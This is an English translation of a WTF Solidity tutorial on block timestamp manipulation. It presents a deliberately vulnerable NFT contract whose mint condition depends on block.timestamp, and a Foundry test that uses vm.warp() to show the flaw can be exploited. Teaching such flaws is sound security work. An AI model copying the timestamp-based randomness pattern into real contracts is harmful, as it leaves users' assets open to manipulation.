---
title: S14. Block Timestamp Manipulation
tags:
  - solidity
  - security
  - timestamp
---

# WTF Solidity S14. Block Timestamp Manipulation

Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy\_](https://twitter.com/WTFAcademy_)

Community: [Discord](https://discord.gg/5akcruXrsk)｜[Wechat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Website wtf.academy](https://wtf.academy)

Codes and tutorials are open source on GitHub: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

English translations by: [@to_22X](https://twitter.com/to_22X)

---

In this lesson, we will introduce the block timestamp manipulation attack on smart contracts and reproduce it using Foundry. Before the merge, Ethereum miners can manipulate the block timestamp. If the pseudo-random number of the lottery contract depends on the block timestamp, it may be attacked.

## Block Timestamp

Block timestamp is a `uint64` value contained in the Ethereum block header, which represents the UTC timestamp (in seconds) when the block was created. Before the merge, Ethereum adjusts the block difficulty according to the computing power, so the block time is not fixed, and an average of 14.5s per block. Miners can manipulate the block timestamp; after the merge, it is changed to a fixed 12s per block, and the validator cannot manipulate the block timestamp.

In Solidity, developers can get the current block timestamp through the global variable `block.timestamp`, which is of type `uint256`.

## Vulnerable Contract Example

This example is modified from the contract in [WTF Solidity S07. Bad Randomness](https://github.com/AmazingAng/WTF-Solidity/tree/main/32_Faucet). We changed the condition of the `mint()` minting function: it can only be successfully minted when the block timestamp can be divided by 170:

```solidity
contract TimeManipulation is ERC721 {
    uint256 totalSupply;

    // Constructor: Initialize the name and symbol of the NFT collection
    constructor() ERC721("", ""){}

    // Mint function: Only mint when the block timestamp is divisible by 170
    function luckyMint() external returns(bool success){
        if(block.timestamp % 170 == 0){
            _mint(msg.sender, totalSupply); // mint
            totalSupply++;
            success = true;
        }else{
            success = false;
        }
    }
}
```

## Reproduce on Foundry

Attackers only need to manipulate the block timestamp and set it to a number that can be divided by 170, and they can successfully mint NFTs. We choose Foundry to reproduce this attack because it provides cheatcode to modify the block timestamp. If you are not familiar with Foundry/cheatcode, you can read the [Foundry tutorial](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md) and [Foundry Book](https://book.getfoundry.sh/forge/cheatcodes).

1. Create a `TimeManipulation` contract variable `nft`.
2. Create a wallet address `alice`.
3. Use the cheatcode `vm.warp()` to change the block timestamp to 169, which cannot be divided by 170, and the minting fails.
4. Use the cheatcode `vm.warp()` to change the block timestamp to 17000, which can be divided by 170, and the minting succeeds.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TimeManipulation.sol";

contract TimeManipulationTest is Test {
    TimeManipulation public nft;

    // Computes address for a given private key
    address alice = vm.addr(1);

    function setUp() public {
        nft = new TimeManipulation();
    }

    // forge test -vv --match-test  testMint
    function testMint() public {
        console.log("Condition 1: block.timestamp % 170 != 0");
        // Set block.timestamp to 169
        vm.warp(169);
        console.log("block.timestamp: %s", block.timestamp);
        // Sets all subsequent calls' msg.sender to be the input address
        // until `stopPrank` is called
        vm.startPrank(alice);
        console.log("alice balance before mint: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("alice balance after mint: %s", nft.balanceOf(alice));

        // Set block.timestamp to 17000
        console.log("Condition 2: block.timestamp % 170 == 0");
        vm.warp(17000);
        console.log("block.timestamp: %s", block.timestamp);
        console.log("alice balance before mint: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("alice balance after mint: %s", nft.balanceOf(alice));
        vm.stopPrank();
    }
}

```

After installing Foundry, start a new project and install the openzeppelin library by entering the following command on the command line:

```shell
forge init TimeMnipulation
cd TimeMnipulation
forge install Openzeppelin/openzeppelin-contracts
```

Copy the code of this lesson to the `src` and `test` directories respectively, and then start the test case with the following command:

```shell
forge test -vv --match-test testMint
```

The test result is as follows:

```shell
Running 1 test for test/TimeManipulation.t.sol:TimeManipulationTest
[PASS] testMint() (gas: 94666)
Logs:
  Condition 1: block.timestamp % 170 != 0
  block.timestamp: 169
  alice balance before mint: 0
  alice balance after mint: 0
  Condition 2: block.timestamp % 170 == 0
  block.timestamp: 17000
  alice balance before mint: 0
  alice balance after mint: 1

Test result: ok. 1 passed; 0 failed; finished in 7.64ms
```

We can see that when we modify `block.timestamp` to 17000, the minting is successful.

## Summary

In this lesson, we introduced the block timestamp manipulation attack on smart contracts and reproduced it using Foundry. Before the merge, Ethereum miners can manipulate the block timestamp. If the pseudo-random number of the lottery contract depends on the block timestamp, it may be attacked. After the merge, Ethereum changed to a fixed 12s per block, and the validator cannot manipulate the block timestamp. Therefore, this type of attack will not occur on Ethereum, but it may still be encountered on other public chains.
